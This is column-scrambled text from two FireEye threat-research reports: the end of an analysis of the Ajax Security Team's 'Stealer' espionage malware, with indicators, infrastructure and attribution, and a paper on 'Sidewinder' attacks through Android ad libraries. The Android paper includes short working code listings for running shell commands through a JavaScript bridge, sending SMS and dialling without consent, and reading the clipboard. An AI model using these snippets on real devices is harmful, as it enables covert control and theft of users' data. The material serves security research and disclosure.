    d:\svn\Stealer\source\Stealer\Stealer\obj\      CompanyName
                                   x86\Release\Stealer.pdb
                                                                                   Microsoft
                                                                                   FileDescription
                             
    f:\Projects\C#\Stealer\source\Stealer\
                                                                                   Process for Windows
                                   Stealer\obj\x86\Release\Stealer.pdb
                                                                                   FileVersion
                             These strings indicate that the Stealer source        1.0.0.0
                             code was stored in two different paths but not        InternalName
                             necessarily on two different computers. The f:\       Stealer.exe
                             Projects\ path may be from an external storage        LegalCopyright
                             device such as a thumb drive. It is therefore         Copyright
                             possible that only one person has access to the          2013
                             source code, but keeps a separate repository on       OriginalFilename
                             an external storage device. Alternatively, the        Stealer.exe
                             different file paths could be the result of two
                                                                                   ProductName
                             different actors storing their source code in two
                                                                                   Process for Windows
                             different locations.
                                                                                   ProductVersion
                             Builder Artifacts                                     1.0.0.0
                             In nine of the implants that we collected, we found   Assembly Version
                             a consistent portable executable (PE) resource        1.0.0.0
                             with a SHA256 of
                             5156aca994ecfcb40458ead8c830cd66469d5f5
                             a031392898d323a8d7a7f23d3. This PE
                             resource contains the VS_VERSION_INFO. In
                             layman
s terms, this can best be described as the
                             metadata describing the executable file. This
                             specific PE resource contained the
                             following information:
                             Note the InternalName of 
Stealer.exe
. This is the
                             attackers
 name for this malware family.
10 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             The 
Stealer
 Builder and Tools                             The Builder option enables an attacker to
                             During our research, we recovered two different             configure a new Stealer backdoor. The user can
                             tools used by the members of the Ajax Security              configure the new backdoor to connect to a
                             Team in conjunction with targeted intrusion                 specific CnC server with a personalized username
                             activities. The first tool, labeled the 
Stealer Builder
   and password. The attacker can bind the backdoor
                             was compiled on 2014-04-08. This compile date               to a legitimate application of his or her choosing, or
                             may indicate that the group is still active.                they can cloak it with an icon designed to make the
                                                                                         backdoor appear as though it is a legitimate file.
                             Upon executing the 
Stealer Builder
 the user is            We also noted that the Builder did not allow the
                             presented with an option to load the 
Builder
 or to        attacker to select a new passphrase or salt used to
                             
Decrypt
 logs generated from a victim and                  encrypt the stolen data. The passphrase
                             exfiltrated to a command-and-control (CnC) server           
HavijeBaba
 and a salt of 
salam!*%#
 are both
                             under the groups
 control.                                  hardcoded into the builder.
     Figure 8: The Stealer Tool
     Figure 9: The Stealer Builder
11 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             During testing, we observed that backdoors            Base64 encoded text into plaintext. Members of
                             generated by this Stealer Builder had a timestamp     the Ajax Security Team likely this use tool to
                             of 2013-12-19. We had one backdoor in our             encode the configuration data seen in
                             repository with this same timestamp. This sample      RapidStartTech.stl files. As noted above, the
                                                                                   RapidStartTech.stl contains the backdoor
s FTP
                             (MD5 1823b77b9ee6296a8b997ffb64d32d21)                credentials, implant name, decoy name, and
                             was configured to exfiltrate data to ultrasms[.]ir.   screenshot interval, along with boolean settings for
                             The VS_VERSION_INFO PE resource mentioned             startup, keylogger, and screenshot plugins.
                             above (SHA256
                             5156aca994ecfcb40458ead8c830cd66469d5f5               Encoding and decoding Base64 data is a
                             a031392898d323a8d7a7f23d3) is an artifact of          straightforward task and the standard Linux
                             the Stealer builder that we recovered. The builder    operating system offers a number of command line
                             generates an executable named IntelRapidStart.        tools to achieve this task. The presence of a
                             exe. This executable contains the aforementioned      Windows-based GUI tool that simplifies encoding
                             VS_VERSION_INFO PE resource.                          and decoding Base64 data indicates that these
                                                                                   tools may have been developed for less adept
                             We also recovered a tool designed to encode           users.
                             plaintext into Base64 encoded text or decode
     Figure 10: Base64 Encoder
12 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                                Command-and-Control Infrastructure                    The website used in the Aerospace Conference
                                The CnC infrastructure consists of distinct, but      attack was aeroconf2014[.]org, which is registered
                                linked, clusters that have targeted both the users    to info@usa.gov[.]us. However, historical WHOIS
                                of anti-censorship tools in Iran as well as defense   information shows that the domain was registered
                                contractor companies in the U.S.                      by keyvan.ajaxtm@gmail[.]com
the same domain
                                                                                      used to register ajaxtm[.]org, the website of the
                                The first cluster contains the domain used in the     Ajax Security Team. The same email addresses
                                Aerospace Conference attack as well as the            were used to register variations of domain names
                                domains used in phishing attacks designed to          associated with popular services provided by
                                capture user credentials:                             companies such as Google, Facebook, Yahoo and
                                                                                      LinkedIn.
     Figure 11: Ajax Security
     Team
s Phishing
     Infrastructure
13 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             The second cluster comprises the CnC                  domains registered by osshom@yahoo[.]com, many
                             infrastructure used in the anti-censorship attacks.   of which are consistent with the pattern of
                             The majority of the samples we analyzed connect       registering domains with associations to Google
                             to intel-update[.]com and update-mirror[.]com,        and Yahoo services. We also observed crossover
                             which were registered by james.mateo@aim[.]com.       with a sample that connected to both intel-
                             The domain intel-update[.]com resolved to the IP      update[.]com and ultrasms[.]ir, which was
                             address 88.150.227.197, which also hosted             registered by lvlr98@gmail[.]com.
     Figure 12: Ajax Security
     Team
s Stealer CnC
     Infrastructure
   Figure 13: Overlap between the
   phishing and stealer clusters
14 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             These two clusters are linked by a common IP            found that the majority had either their timezone
                             address (5.9.244.151), which is used by both ns2.       set to 
Iran Standard Time
 or had their language
                             aeroconf2014[.]org and office.windows-                  setting set to Persian:
                             essentials[.]tk.
                                                                                     
    44 had their timezone set to 
Iran Standard
                             A third cluster of activity was found via analysis of         Time
 (37 of those also have their language set
                             1d4d9f6e6fa1a07cb0a66a9ee06d624a. This                        to Persian)
                             sample is a Stealer variant that connects to the
                             aforementioned intel-update[.]com as well as            
    Of the remaining 33, 10 have Persian
                             plugin-adobe[.]com. The domain plugin-adobe[.]                language settings
                             com resolved to 81.17.28.235. Other domains
                             seen resolving to IP address nearby include the         
    12 have either Proxifier or Psiphon installed
                             following:                                                    or running (all 12 had a Persian language
                                                                                           setting and all but one had their timezone set
                             Aside from the sample connecting to plugin-                   to 
Iran Standard Time
                             adobe[.]com, we have not discovered any malware
                             connecting to these domains.                            The largest concentration of victims is in Iran,
                                                                                     based on the premise that Persian language
                             Victimology                                             settings and 
Iran Standard Time
 correlate the
                             During our investigation, we were able to recover       victim to be geographically located in Iran. As such,
                             information on 77 victims from one CnC server           we believe that attackers disguised malware as
                             that we discovered while analyzing malware              anti-censorship tools in order to target the users of
                             samples that were disguised as anti-censorship          such tools inside Iran as well as Iranian dissidents
                             tools. While analyzing the data from the victims, we    outside the country.
                              Domain                          IP                          First Seen                  Last Seen
                              yahoomail.com.co                81.17.28.227                2013-11-28                  2014-4-10
                              privacy-google.com              81.17.28.229                2014-02-14                  2014-02-23
                              xn--google-yri.com              81.17.28.229                2013-12-08                  2014-01-15
                              appleid.com.co                  81.17.28.231                2014-02-20                  2014-02-20
                              accounts-apple.com              81.17.28.231                2013-12-31                  2014-02-20
                              users-facebook.com              81.17.28.231                2014-01-15                  2014-01-15
                              xn--facebook-06k.com 81.17.28.231                           2013-11-27                  2014-03-07
15 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             Attribution                                                                      several exploits for content management systems
                             The Ajax Security Team appears to have been                                      and engaged in defacements.25 Initially, the
                             formed by personas named 
HUrr!c4nE!
 and                                        defacements seemed to be motivated by a desire
                             
Cair3x
 in 2010.24 Both members were engaged in                                 to demonstrate the group
s prowess
they even
                             website defacements prior to the forming of the                                  defaced an Iranian government website.26
                             Ajax Security Team, and both were members of
                             Iranian hacker forums such as ashiyane[.]org and                                 However, the group appears to have become
                             shabgard[.]org. Other members include 
0day
,                                    increasingly political. For example, in a blog post in
                             
Mohammad PK
 and 
Crim3r
. The Ajax Security                                    2012, 
Cair3x
 announced the targeting of Iran
                             Team website at ajaxtm[.]org had a Web forum                                     political opponents.
                             with at least 236 members. The group published
  Figure 14: Cair3x
s original
  blog post and translation
                                            Hacking anti-revolution political and opposition websites
                                            Hello to everyone, After a while of operating underground
                                            and enhancing our company
s projects and getting close to
                                            24 June 2012, and the martyrdom of Ayatollah Dr. Beheshti
                                            and 72 of Imam Khomeini
s (First and Former supreme
                                            leader of Iran) followers, we have planned a project/
                                            initiative to attack anti-revolution and political
                                            websites against the Islamic Republic. And in late hours
                                            of Wednesday, June 24, 2012, we attacked these websites
                                            and defaced them by writing the words 
We are young but
                                            we can
 on their websites. This is so the enemies of this
                                            country know that the blood of our martyr will never be
                                            in vain and they will always be remembered in the heart
                                            of gallant Iranians.
                             24
                                 
   By March 2010 HUrr!c4nE! was identifying as a member of Ajax Security Team in exploit releases http://www.exploit-db.com/exploits/17011/ and the
                                     first defacement archived by Zone-H, which lists both HUrr!c4nE! and Cair3x as members was December 2010 http://www.zone-h.org/mirror/
                                     id/12730879
                             25
                                 
   http://osvdb.org/affiliations/1768-ajax-security-team http://www.exploit-db.com/author/?a=3223 http://packetstormsecurity.com/files/author/9928/
                             26
                                 
http://www.zone-h.org/mirror/id/13225183
16 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             In 2013, the Ajax Security Team, and 
HUrr!c4nE!
                                  
HUrr!c4nE!
 has the most open/documented
                             in particular, took part in 
#OpIsrael
 and                                        Internet persona of the Ajax Security Team. He
                             
#OpUSA
.27                                                                        registered the ajaxtm[.]org domain name using the
                                                                                                                email address keyvan.ajaxtm@gmail[.]com. This
                             By early 2014, the Ajax Security Team appears to                                   was also the email address used to register the
                             have dwindled. There have been no defacements                                      domain aerospace2014[.]org, which was used in
                             since December 2013. The website and forum at                                      spear phishing attacks against companies in the
                             ajaxtm[.]org operated by 
HUrr!c4nE!
, aka                                         U.S. and is linked with malware activity directed at
                             
k3yv4n
, is no longer active.                                                     users of anti-censorship tools in Iran.
    Figure 15: Screenshot of the
    defacement content used in
    #OpUSA
                              27
                                   Ashraf, N. 
#OpIsrael: Hacktivists Starting Cyber Attack against Israel on 7th of April
. March 2013. 
OpUSA Targeting Government & Financial Sectors on
                                       07 May 2013: Likely Tools, Targets and Mitigating Measures
. May 2013.
17 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                             
HUrr!c4nE!
 features prominently in all the                                        For example, the Ajax Security Team could just be
                             group
s activities and defacements. Although there                                  using anti-censorship tools as a lure because they
                             has been a decline in public-facing Ajax Security                                   are popular in Iran, in order to engage in activities
                             Team activity, this coincides with an increase in                                   that would be considered traditional cybercrime. In
                             malware activity linked to the group
s                                              one case, 
HUrr!c4nE!
, using the email address
                             infrastructure.                                                                     keyvan.ajaxtm@gmail[.]com, has been flagged for
                                                                                                                 possible fraud by an online retailer. While
                             
 ~2009
Membership in ashiyane.org and                                              
HUrr!c4nE!
 is engaged in operations that align
                             shabgard.org forums                                                                 with Iran
s political objectives, he may also be
                                                                                                                 dabbling in traditional cybercrime.
                             
 2010 
 2012
Defacements, Release of exploits
                             for CMS                                                                             This indicates that there is a considerable grey area
                                                                                                                 between the cyber espionage capabilities of Iran
                             
 2012 
 2013
Increasing politicization,                                            hacker groups and any direct Iranian government
                             participation on #OpIsrael, #OpUSA                                                  or military involvement.
                             
 2013 
 2014
Transition to cyber-espionage                                         On the spectrum of state responsibility, these
                                                                                                                 attacks align with state-encouraged attacks, which
                             The increasing politicization of the Ajax Security                                  are defined as attacks in which:
                             Team aligns with the timing of their activities
                             against the perceived enemies of Iran. In addition                                  Third parties control and conduct the attack, but
                             to attacking companies in the U.S., they have                                       the national government encourages them as a
                             targeted domestic users of anti-censorship                                          matter of policy.28
                             technology.
                                                                                                                 Recruiting hackers through this model allows Iran
                             While the objectives of this group are consistent                                   to influence their activities, and provides the
                             with Iran
s efforts at controlling political dissent                                Iranian government plausible deniability, but a lack
                             and expanding offensive cyber capabilities, the                                     of direct control also means that the groups may be
                             relationship between this group and the Iranian                                     unpredictable and engage in unsanctioned attacks.
                             government remains inconclusive.
 Figure 16: Screenshot
 of an online retailer
 fraud alert
                             28
                                  Healey, J. 
Beyond Attribution: Seeking National Responsibility for Cyber Attacks
. January 2012.
18 www.fireeye.com
Fireeye: Operation Saffron Rose 2013
                                     Conclusion                                               About FireEye
                                     The increased politicization of the Ajax Security        FireEye has invented a purpose-built, virtual
                                     Team, and the transition from nuisance                   machine-based security platform that provides
                                     defacements to operations against internal               real-time threat protection to enterprises and
                                     dissidents and foreign targets, coincides with           governments worldwide against the next
                                     moves by Iran aimed at increasing offensive cyber        generation of cyber attacks. These highly
                                     capabilities. While the relationship between actors      sophisticated cyber attacks easily circumvent
                                     such as the Ajax Security Team and the Iranian           traditional signature-based defenses, such as
                                     government is unknown, their activities appear to        next-generation firewalls, IPS, anti-virus, and
                                     align with Iranian government political objectives.      gateways. The FireEye Threat Prevention Platform
                                                                                              provides real-time, dynamic threat protection
                                     The capabilities of the Ajax Security Team remain        without the use of signatures to protect an
                                     unclear. This group uses at least one malware            organization across the primary threat vectors and
                                     family that is not publicly available. We have not       across the different stages of an attack life cycle.
                                     directly observed the Ajax Security Team use
                                     exploits to deliver malware, but it is unclear if they   The core of the FireEye platform is a virtual
                                     or other Iranian actors are capable of producing or      execution engine, complemented by dynamic
                                     acquiring exploit code.                                  threat intelligence, to identify and block cyber
                                                                                              attacks in real time. FireEye has over 1,500
                                     While the Ajax Security Team
s capabilities remain       customers across more than 40 countries,
                                     unclear, we know that their current operations           including over 100 of the Fortune 500.
                                     have been somewhat successful as measured by
                                     the number of victims seen checking into to an Ajax
                                     Security Team controlled CnC server. We believe
                                     that if these actors continue the current pace of
                                     their operations they will improve their capabilities
                                     in the mid-term.                                         We thank Kenneth Geers and Jen Weedon for their support and analysis on
                                                                                              these findings.
FireEye, Inc. | 1440 McCarthy Blvd. Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com
 2014 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
marks of their respective owners. 
 RPT.OSR.EN-US.082014
19 www.fireeye.com
                  REPORT
SIDEWINDER
TARGETED ATTACK
AGAINST ANDROID
IN THE GOLDEN
AGE OF AD
LIBRARIES
           SECURITY
           REIMAGINED
FireEye: Sidewinder Targeted Attack against Android
CONTENTS
Introduction................................................................................................................................................................................................................................................................................................................................................ 3
Sidewinder Targeted Attack Overview............................................................................................................................................................................................................................. 3
Warhead: Attacking Vulnerabilities of Android........................................................................................................................................................................................ 5
              Piercing The Armor................................................................................................................................................................................................................................................................................................. 5
              Detonation without Android Context.................................................................................................................................................................................................................... 7
              Detonation with Android Context................................................................................................................................................................................................................................... 8
Targeting Victims Based on Ad Traffic............................................................................................................................................................................................................................ 11
              Communication Channels Prone to Hijack.......................................................................................................................................................................................... 11
              Information Leakage from Ad Libraries....................................................................................................................................................................................................... 11
              Large-scale Monitoring and Precise Hijacking........................................................................................................................................................................... 12
Targetable and Exploitable Google Play Apps ......................................................................................................................................................................................... 13
Conclusion................................................................................................................................................................................................................................................................................................................................................. 20
2 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              Introduction                                                                     Finally, we show that this threat is not only real
                              By 2014, the number of Android users has                                         but also prevalent due to the popularity of
                              grown to 1.1 billion and the number of Android                                   Android ad libraries. We hope this paper
                              devices has reached 1.9 billion1. At the same                                    kickstarts the conversation on how to better
                              time, enterprises are also embracing Android-                                    protect the security and privacy in third-party
                              based Bring Your Own Device (BYOD) solutions.                                    libraries and how to further harden the Android
                              For example, in Intel
s BYOD program, there are                                  security framework in the future.
                              more than 20,000 Android devices across over
                              800 combinations of Android versions and
                              hardware configurations2.
                                                                                                               Sidewinder Targeted Attack Overview
                              Although little malware has been found in Google                                 To understand the security risks brought by a
                              Play, both Android apps and the Android system                                   Sidewinder Targeted Attack, we first explain one
                              itself contain vulnerabilities. Aggressive ad                                    possible attack mechanism (illustrated in Figure 1)
                              libraries also leak the user
s private information.                              that is similar to that of Sidewinder missiles. The
                              By leveraging all these vulnerabilities, an attacker                             attacker can hijack the network where the
                              can conduct more targeted attacks, which we call                                 targeted victim resides. Like an infrared homing
                              
Sidewinder Targeted Attacks.
 In this paper we                                  system, the attacker then seeks 
emission
 from ad
                              explain the security risks from such attacks, in                                 libraries running on the target device to track and
                              which an attacker can intercept and use private                                  lock on it. Once the target is locked on, the
                              information uploaded from ad libraries to                                        attacker can launch advanced persistent attacks.
                              precisely locate targeted areas such as a CEO
s                                  To minimize detection chances, the attacker can
                              office or specific conference rooms. When the                                    choose to take action on important targets only,
                              target is identified, a 
Sidewinder Targeted Attack
                             ignoring all other devices. In later sections, we
                              exploits popular vulnerabilities in ad libraries, such                           discuss attacking (
warhead
) and targeting
                              as Javascript-binding-over-HTTP or dynamic-                                      (
homing
) components in detail and show how a
                              loading-over-HTTP, etc.                                                          combination of these components can launch
                                                                                                               powerful and precise attacks on target devices.
                              It is a well-known challenge for an attacker to call
                              Android services from injected native code that                                  Table 1 proposes different attacks that an
                              doesn
t have Android application context. Here,                                  attacker can launch remotely on target devices
                              we explain how attackers can invoke Android                                      through vulnerable ad libraries. Figure 2 shows a
                              services for tasks including taking photos, calling                              proof-of-concept attack control interface. This
                              phone numbers, sending SMS, reading from/                                        attack targets one of the ad libraries described in
                              writing to the clipboard, etc. Furthermore, the                                  this paper. The security risks become obvious by
                              attackers can exploit several Android                                            looking at what the attacker can do with this
                              vulnerabilities to get valuable private information                              control interface. The left panel enables the
                              or to launch more advanced attacks.                                              attacker to command the victim's device,
                              1
                               
 Ranjit Atwal, Lillian Tay, Roberta Cozza, Tuong Huy Nguyen, Tracy Tsai, Annette Zimmermann, and CK Lu. Forecast: Pcs, ultramobiles and mobile phones,
                                 worldwide, 2010-2017, 4q13 update. Gartner, 2013.
                              2
                               
 Rob Evered, Steve Watson, Paul Dockter, and Derek Harkin. Android devices in a byod environment. Intel White Paper, 2013.
3 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              including uploading local files, taking pictures,                 installed app list, clipboard, a photo taken from
                              recording audio/video, manipulating the                           the back camera, an audio clip, and a video clip
                              clipboard, sending SMS, dialing numbers,                          have been uploaded, with the GPS location
                              implanting bootkit, or installing the attacker
s                  intercepted from the ad library. The panel also
                              apps uploaded to Google Play, etc. The right                      pins down the GPS location of the victim
                              panel lists all information stolen from the                       device onto a Google Map widget.
                              victim
s device. In this screenshot, the victim
     Figure 1:
     Illustration of
     the Sidewinder
                                                                                                                            Info uploaded from ad libs
     Targeted Attack
     Scenario
                              Attack Overview                                                                                        Serving Normal ad
                                                                                                                              Injecting attack payload
                                                                                                                                   Comman & Control
                                                      Device A
                                               Device
                                               Victim
                                                      Device B                               Attacker
s                         Actual
                                                                                               Server                          Ad Server
                              
     Table 1: Outline                     API Level                                        
 API 16                                      > API 16
     of the Sidewinder
     Targeted                            Attack Vector                               JBOH and DLOH                                      JS Sidedoor
     Attack through                     31.08%                     (w/ Android Context )         (w/o Android Context )
     Vulnerable Ad                                                                                       51.04%              48.96%
     Libraries
                                                         68.92%   Clipboard manipulation       Local files uploading Root
                                                                     Launcher settings          exploit & Code injection             Abusing privileged
                                           Attacks
                                                                    modification Proxy                                                  interfaces
                                                                       modification            Implanting bootkit Sending
                                                                                                SMS Making phone calls
                                                                  Taking pictures Audio &
                                                                  video recording Stealthy
                                                                      app installation
4 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              Based on this precise position information, it is easy to identify individuals or groups of 
 targets by
                              which offices they are in.
     Figure 2: The
     control panel of
     the attacker, and
     the files uploaded
     from the victim
                              Warhead: Attacking Vulnerabilities                                             (Android 4.1) or below. As noted by Google: 
                              of Android                                                                     of this method in a WebView containing
                                                                                                             untrusted content could allow an attacker to
                              Piercing The Armor                                                             manipulate the host application in unintended
                              In this section, we explain in more detail the risks                           ways, executing Java code with the permissions
                              of remote attacks on the Android devices.                                      of the host application.
                              Attacking JavaScript Binding over                                              In particular, if an app running on Android API 16
                              HTTP (JBOH)                                                                    or below uses the JavaScript binding method
                              Android uses the JavaScript binding method                                     addJavascriptInterface and loads the content
                              addJavascriptInterface to enable JavaScript                                    in the WebView over HTTP, an attacker over the
                              code running inside a WebView to access the                                    network could hijack the HTTP traffic (e.g.,
                              app
s Java methods (also known as the Javascript                               through WiFi or DNS hijacking) to inject
                              bridge). However, it is widely known that this                                 malicious content into the WebView and to
                              feature, if not used carefully, presents a potential                           control the host application. Listing 1 is a sample
                              security risk when running on Android API 16                                   Javascript snippet to execute shell command.
                              3
                               
 http://developer.android.com/reference/android/webkit/WebView.html# addJavascriptInterface(java.lang.Object,%20java.lang.String).
5 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
     Figure 3: Target
     SDK statistics of
     popular Google
     Play apps                        31.08%                                        API <=16                                                         API <=16
                                                                                    API >=16                          51.04%                48.96%   API >16
                                                        68.92%
                                     (a) Statistics by app number                                                     (b) Statistics by app download count
     Listing 1: Sample
     Javascript snippet            jsObj.getClass().forName(
java.lang.Runtime
     to execute shell              
.getMethod(
getRuntime
,null).invoke(null,null).exec(cmd)
     command
                              We call this the JavaScript-Binding-Over-HTTP                                    Attacking Annotated JavaScript
                              (JBOH) vulnerability4. This applies to insecure                                  Binding Interfaces
                              HTTPS channels as well. If an app containing such                                Starting with Android 4.2 (API>16), Google
                              vulnerability has sensitive Android permissions                                  introduced the @JavascriptInterface
                              such as access to the camera, a remote attacker                                  anno- tation6 to explicitly designate and restrict
                              could exploit it to perform sensitive tasks such as                              which public Java methods in the app were
                              taking photos or recording video, over the                                       accessible from JavaScript running inside
                              Internet, without consent. Based on the official                                 a WebView. However, if an ad library uses the
                              data in June 20145, ~60% of Android devices are                                  @JavascriptInterface annotation to expose
                              still running API
16.                                                            security-sensitive interfaces, and uses HTTP to
                                                                                                               load content in the WebView, it is vulnerable to
                              Note that API>16 platforms are not necessarily                                   attacks where an attacker over the network
                              secure. If the app is targeting at a lower API                                   could inject malicious content into the WebView
                              level, Android will still run it with the lower API                              to misuse the interfaces exposed through the JS
                              level for compatibility reasons. Figure 3 shows                                  binding annotation. We call these exposed JS
                              the targeted API of popular Google Play apps,                                    binding annotation interfaces 
JS Sidedoors.
                              each of which has over 50,000 downloads. We
                              can see that a large portion of apps are                                         For example, we found a list of sensitive
                              targeting at API
16.                                                             Javascript interfaces that are publicly ex- posed
                                                                                                               from certain versions of a real-world ad library:
                              4
                               
 http://www.fireeye.com/blog/technical/2014/01/js-binding-over-http- vulnerability-and-javascript-sidedoor.html.
                              5
                               
https://developer.android.com/about/dashboards/index.html.
                              6
                               
 http://developer.android.com/reference/android/webkit/ JavascriptInterface.html.
6 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              createCalendarEvent, makeCall,                                           functionalities, especially remote call invocations,
                              postToSocial, sendMail, sendSMS,                                         are encapsulated in the context. We discuss
                              takeCameraPicture, getGalleryImage,                                      attacks requiring context in a later section. In this
                              registerMicListener, etc4. Given that this ad                            section, we explain attacks that don
t need
                              library loads ads using HTTP, if the host app has                        Android context, and discuss their security risks.
                              the corresponding permissions (e.g., CALL
                              PHONE), attackers over the network can abuse                             Root Exploits and Code Injection
                              these interfaces to do malicious things (e.g.,                           One direct threat posed by JBOH is to use the
                              utilizing the makeCall interface to dial phone                           JBOH shell (Listing 1) to download exe- cutables
                              numbers without the user
s consent).                                     and use them to root the device. Commercial
                                                                                                       one-touch root apps claim they can root more
                              Security Issues with DEX Loading over                                    than 1,000 brands (>20,000 models) 8.
                              HTTP (DLOH)                                                              towelroot 9, which exploits a bug found
                              Similar to JBOH, DEX loading over HTTP or                                recently in Linux kernel, claims that it can root
                              insecure HTTPS (DLOH) is another serious issue                           most new devices released before June 2014.
                              raised by ad libraries. If the attackers can hijack                      Thus, as long as attackers can get the JBOH shell,
                              the communication channels and inject malicious                          they have the tools to obtain root on most
                              DEX files, they can then control the behaviors of                        Android phone models.
                              the victim apps.
                                                                                                       Even if the attackers can
t obtain root, they can
                              Detonation without Android Context                                       attempt ptrace 10 to control the host app.
                              After getting local access, the attacker can upload                      Although only processes with root privilege can
                              private and sensitive files from the victim
s device,                    ptrace others, child processes are able to
                              or modify files that the host app can write to (e.g.,                    ptrace their parents. Because the shell
                              the directory of the host app and SD Card with                           launched from the Javascript bridge is a child
                              FAT file system).                                                        process of the host app, it can ptrace the host
                                                                                                       app
s process. Note that only apps with
                              To launch more sophisticated attacks like sending                        android:debuggable set as 
true
 in the manifest
                              SMS or taking pictures, the attackers may use                            can be ptraced, which limits its adoption.
                              Java reflection to call other APIs from the
                              Javascript bridge. It appears this method makes                          Sending SMS and Dialing Numbers without
                              sending SMS easy. However, some other                                    User Consent
                              operations require Android context 7 or                                  Sending SMS does not require context or user
                              registering Java callbacks. Android context                              interaction. A simple call does the job, as
                              provides an interface to the global information                          shown in Listing 2
                              about an app
s environment. Many Android
     Listing 2: Sending
     SMS without user             SmsManager.getDefault().sendTextMessage(phoneNumber,null,message,null,null);
     consent
                              7
                               
http://developer.android.com/reference/android/content/Context.html.
                              8
                               
http://shuaji.360.cn/root/.
                              9
                               
http://towelroot.com/.
                              10
                                
http://linux.die.net/man/2/ptrace.
7 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              To make calls from the Javascript bridge                                       Javascript bridge. Code in Listing 4, for
                              without user consent, we can invoke the                                        example, is an easy way to get context from
                              telephony service to dial numbers directly via                                 anywhere of the application.
                              binder, as shown in Listing 3, where phone is
                              the remote Android telephony service and the                                   Operations like taking pictures and recording
                              number 2 represents the second remote call.                                    videos need to register Java callbacks. The
                              s16 is the type marker represents 
16 bit                                      attackers either need to boot a Java VM from
                              string,
 and packageName is the host app
s                                     the Javascript bridge, or to inject code into
                              package name, where we can obtain from the                                     the host app
s Java VM.
                              information posted from the ad libraries. The
                              sequence number of the remote calls can be                                     Fortunately, Android Runtime offers another
                              found in the corresponding Android Interface                                   way to load Java Native Interface (JNI) code
                                                                                                             into the host app using Runtime.load(). As
                              Definition Language (AIDL) files 11. Many other                                shown in Listing 5, an attacker can load
                              Android services can be invoked in the same                                    executables compiled from JNI code. Once
                              way, including sending SMS                                                     loaded, the code can obtain context as described
                                                                                                             in Listing 4, or call DexClassLoaderload12 to
                              Detonation with Android Context                                                inject new classes from the attackers
 DEX
                              As mentioned, it is more convenient to                                         files to register callbacks to take pictures/
                              directly obtain the Android context via the                                    record videos.
     Listing 3: Dial
     numbers without               Runtime.getRuntime()
     user consent                  
   .exec(
service call phone 2 s 16 
+ packageName +
 s16
 + phoneNumber);
     Listing 4: Sample
     code to obtain                // We omit all try
catch statements and other unimportant code in this paper
     context
                                   public ContextgetContext(){
                                   
finalClass<?>activityThreadClass=Class
                                   
.forName(
android.app ActivityThread
                                   
finalMethodmethod=activityThreadClass
                                   
.getMethod(
currentApplication
                                   
return(Application)method.invoke(null,(Object[])null);
                                   }
                               
 http://developer.android.com/guide/components/aidl.html.
                              11
                               
http://developer.android.com/reference/dalvik/system/DexClassLoader. html.
                              12
8 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              There are other ways to obtain Android context,                               Using these APIs, the attackers can monitor
                              like reflecting to the private static context                                 changes to a clipboard and transfer the
                              variable of WebView13. However, without Java                                  clipboard contents to some remote server.
                              VM instances, it
s difficult to take pictures and                             They can also alter the clipboard content to
                              record videos. After our submission to Black Hat                              achieve phishing goals. For example, the user
                              in April 2014, we noticed that MWR was also                                   may copy a link to visit and the background
                              concurrently and independently working on this                                malicious service can change that link to a
                              issue. They published a similar mechanism in                                  phishing site. We have notified Google about
                              June 201414.                                                                  this issue.
                              Clipboard Monitoring nd Tampering                                             Launcher Settings Modification
                              With the Android context, an attacker can                                     Android Open Source Project (AOSP) classifies
                              monitor or tamper with the clipboard. Android                                 Android permissions into several protec- tion
                              users may perform copy-paste on important text                                levels: 
normal,
dangerous,
system,
                              content. For example, there are many popular                                  
signature
 and 
development
15,16,17. Dangerous
                              password-management apps in Google Play,                                      permissions
may be displayed to the user and
                              enabling the users to click-and-copy passwords                                require confirmation before pro- ceeding, or
     Listing 5: Sample
     Javascript snippet            jsObj.getClass().forName(
java.lang.Runtime
     to load JNI binary            
   .getMethod (
getRuntime
,null).invoke(null,null).load(binaryPath );
     into the host app
     Java VM
     Listing 6: API
     calls to peek into/           ClipboardManager.getText()
     tamper with the               ClipboardManager.hasPrimaryClip()
                                   ClipboardManager.setText()
     clipboard                     Clipboard Manager.setPrimaryClip()
                                   ClipboardManager.hasText()
                                   ClipboardManager.addPrimaryClipChangedListener()
                                   ClipboardManager.getPrimaryClip()
                              and paste them into login forms. Malicious                                    some other approach may be taken to avoid
                              apps can steal the passwords if they can read                                 the user automatically allowing the use of such
                              the contents on clipboard. Android has no                                     facilities.
In contrast, normal permissions are
                              permissions restricting apps from accessing                                   automatically granted at installation, 
without
                              the global clipboard. Any UID has the capability                              asking for the user
s explicit approval (though
                              to manipulate clipboard via the API calls in Listing 6:                       the user always has the option to review these
                              13
                                
 http://www.weibo.com/p/1001603724694418249344?utm_source=weibolife.
                              14
                                
https://labs.mwrinfosecurity.com/blog/2014/06/12/putting-javascript- bridges-into-android-context.
                              15
                                
 http://developer.android.com/guide/topics/manifest/permission-element.html.
                              16
                                
 https://android.googlesource.com/platform/frameworks/base/+/master/ core/res/AndroidManifest.xml.
                              17
                                
https://android.googlesource.com/platform/packages/apps/Launcher2/+/ master/AndroidManifest.xml.
9 www.fireeye.com
FireEye: Sidewinder Targeted Attack against Android
                              permissions before installing)
15. If an app requests                         corresponding field. Note that the
                              both dangerous permissions and normal                                         proxySettings field is a private Java field not
                              permissions, Android only displays the dangerous                              intended to be accessed by other processes.
                              per- missions by default. If an app requests only                             Unfortunately, the flexible and powerful Java
                              normal permissions, Android doesn
t display any                               reflection mechanism (especially the forName(),
                              permission to the user.                                                       getField(), setAccessible() calls) exposes
                                                                                                            such components to the attackers for arbitrary
                              We have found that certain 
normal
 permissions                               read or write operations.
                              have dangerous security impacts18. For example,
